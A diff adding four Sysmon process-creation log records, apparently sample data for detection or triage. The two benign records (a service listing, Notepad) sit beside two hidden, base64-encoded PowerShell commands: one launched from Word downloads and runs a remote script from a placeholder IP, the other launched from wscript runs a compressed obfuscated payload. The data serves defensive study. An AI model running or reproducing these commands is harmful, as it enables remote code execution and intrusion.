@@ -1,0 +1,32 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>WKS-0142.corp.example</Computer></System>
+  <EventData>
+    <Data Name="UtcTime">2026-09-12 08:14:03.221</Data><Data Name="ProcessGuid">{11111111-0000-0000-0000-000000000001}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA</Data>
+    <Data Name="User">CORP\jdoe</Data><Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>SRV-APP01.corp.example</Computer></System>
+  <EventData>
+    <Data Name="UtcTime">2026-09-12 08:20:10.004</Data><Data Name="ProcessGuid">{11111111-0000-0000-0000-000000000002}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -enc RwBlAHQALQBTAGUAcgB2AGkAYwBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAUwB0AGEAdAB1AHMAIAAtAGUAcQAgAFIAdQBuAG4AaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQA=</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data><Data Name="ParentImage">C:\Windows\CCM\CcmExec.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>WKS-0142.corp.example</Computer></System>
+  <EventData>
+    <Data Name="UtcTime">2026-09-12 08:21:00.000</Data><Data Name="ProcessGuid">{11111111-0000-0000-0000-000000000003}</Data>
+    <Data Name="Image">C:\Windows\System32\notepad.exe</Data><Data Name="CommandLine">notepad.exe notes.txt</Data>
+    <Data Name="User">CORP\jdoe</Data><Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>WKS-0377.corp.example</Computer></System>
+  <EventData>
+    <Data Name="UtcTime">2026-09-12 09:02:41.870</Data><Data Name="ProcessGuid">{11111111-0000-0000-0000-000000000004}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="CommandLine">powershell -w hidden -nop -e SQBFAFgAIAAoAFsASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAXQA6ADoAbgBlAHcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACgAWwBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBMAFkANAB4AGEAOABNAHcARgBJAFQALwB5AGcAMABDADIAUQBSAEwAYwBUAEkAVQBhAGoASwAxAEgAYgBxADAAUQB5AG4AdABxAHMAaQBQAFMASQAwAGkAQwBlAGsAWgBwAGYAKwArAFQAdQBqADIASABmAGMAZABuAEwAQQA0AFEARAA2AG4ARgB1AFYARwBoAG0AVABtAEQAeQA0ACsAbgB1AFEARQBzAGQAdwBhAHgANQB3AGYAdABaAGIAWQBRAE8ANgAyAGUANwBWAFYANAA3AGgAWABEAC8AZQBzAEsANQBzAFQANwBWAFMAdQA0ADgAMQB2AHEALwA5AEcAYgBYAGcALwAvAHAARABsAEYAVgBsADkAMABmAEUAcABlAEkAbwA4ADQAZgBYAGwARwA1ADEAbwBTAHQAaABPAEwASAAwAC8AbwBWAHIASABwAHAANAByAHQAQwAxAGsAbQBLAEEANQA0AGoAUABQAEsANQBhAFYAQwAyAFIATwBqAFUAcAAxAEYAQQBLAEcAbQBEAEsARwBCAHUAZgBuAG0AUwBJAEcAQwAwAC8AWAB6AHAAYwBMAC8AZwA4AHUAOQArAEYAZwBIAGQAbQB6AG8AcQB1ADUANQBFAEMANgA5AEIASwA2AFcAcgBpADAAbABQAEQANwBCAHcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApAA==</Data>
+    <Data Name="User">CORP\asmith</Data><Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
+  </EventData>
+</Event>
